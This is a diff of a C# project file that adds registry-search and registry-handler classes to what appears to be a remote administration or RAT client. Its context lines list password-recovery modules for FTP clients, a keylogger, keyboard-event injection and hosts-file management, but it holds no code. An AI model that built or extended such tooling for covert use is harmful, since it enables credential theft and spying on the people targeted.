@@ -53,6 +53,7 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Core\Commands\RegistryHandler.cs" />
     <Compile Include="Core\Helper\FileHelper.cs" />
     <Compile Include="Core\Helper\FormatHelper.cs" />
     <Compile Include="Core\Helper\HostHelper.cs" />
@@ -82,15 +83,21 @@
     <Compile Include="Core\Encryption\SHA256.cs" />
     <Compile Include="Core\Extensions\RegistryKeyExtensions.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetPasswordsResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetRegistryKeysResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\SetStatusFileManager.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoKeyboardEvent.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoLoadRegistryKey.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetPasswords.cs" />
+    <Compile Include="Core\Registry\RegistrySeeker.cs" />
+    <Compile Include="Core\Registry\RegistrySeekerParams.cs" />
+    <Compile Include="Core\Registry\RegSeekerMatch.cs" />
     <Compile Include="Core\Recovery\FtpClients\FileZilla.cs" />
     <Compile Include="Core\Recovery\FtpClients\WinSCP.cs" />
     <Compile Include="Core\Utilities\FileSplit.cs" />
     <Compile Include="Core\Data\Host.cs" />
     <Compile Include="Core\Utilities\HostsManager.cs" />
     <Compile Include="Core\Utilities\NativeMethods.cs" />
+    <Compile Include="Core\Utilities\RegistryKeyEx.cs" />
     <Compile Include="Core\Utilities\UnsafeStreamCodec.cs" />
     <Compile Include="Core\Compression\JpgCompression.cs" />
     <Compile Include="Core\Extensions\SocketExtensions.cs" />
@@ -200,6 +207,7 @@
     <Compile Include="Core\Utilities\Keylogger.cs" />
     <Compile Include="Enums\MouseAction.cs" />
     <Compile Include="Enums\PathType.cs" />
+    <Compile Include="Enums\RegistrySearchAction.cs" />
     <Compile Include="Enums\ShutdownAction.cs" />
     <Compile Include="Enums\UserStatus.cs" />
     <Compile Include="Program.cs" />
